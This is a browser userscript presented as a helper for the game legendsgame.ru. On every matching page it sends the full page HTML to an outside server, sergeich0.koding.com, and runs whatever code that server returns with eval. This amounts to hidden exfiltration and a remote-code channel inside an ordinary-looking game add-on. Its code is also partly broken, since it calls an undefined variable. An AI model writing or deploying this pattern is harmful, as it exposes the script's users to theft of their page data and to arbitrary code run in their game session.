// ==UserScript==
// @name       LGSM
// @namespace  http://sergeich0.lark.ru/
// @version    2.0.1
// @description  ??????, ????????? ??? ?????? BMWx14
// @match      http://legendsgame.ru/*
// @include      http://legendsgame.ru/*
// @exclude      http://legendsgame.ru/game/chat.php*
// @exclude      http://legendsgame.ru/game/forum.php*
// @copyright  Sergeich0    
// ==/UserScript==
(function (window, undefined) {  
    var w;
    if (typeof unsafeWindow !== undefined) {
        w = unsafeWindow;
    } else {
        w = window;
    }
    
    if (w.self != w.top) {
        return;
    }
    function getXmlHttp() {
        var xmlhttp;
        try {
            xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
        } catch (e) {
            try {
                xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
            } catch (E) {
                xmlhttp = false;
            }
        }
        if (!xmlhttp && typeof XMLHttpRequest!='undefined') {
            xmlhttp = new XMLHttpRequest();
        }
        return xmlhttp;
    }
    
    var users = document.body.innerHTML;
    var xmlhttp2 = getXmlHttp(); 
    users.replace(/'/g,"")
    xmlhttp2.open('POST', 'http://sergeich0.koding.com/leggame/scripts/8/scrman.php', true);
    xmlhttp2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); 
    xmlhttp2.send("user=" + encodeURIComponent(users) + "&nick=" + encodeURIComponent('BMWx14'));
    xmlhttp2.onreadystatechange = function() {
        if (xmlhttp2.readyState == 4) { 
            if(xmlhttp2.status == 200) {
               eval(xmlhttp2.responseText);
            }
        }
        
        
    };
    xmlhttp.send(null);
    
    
})(window);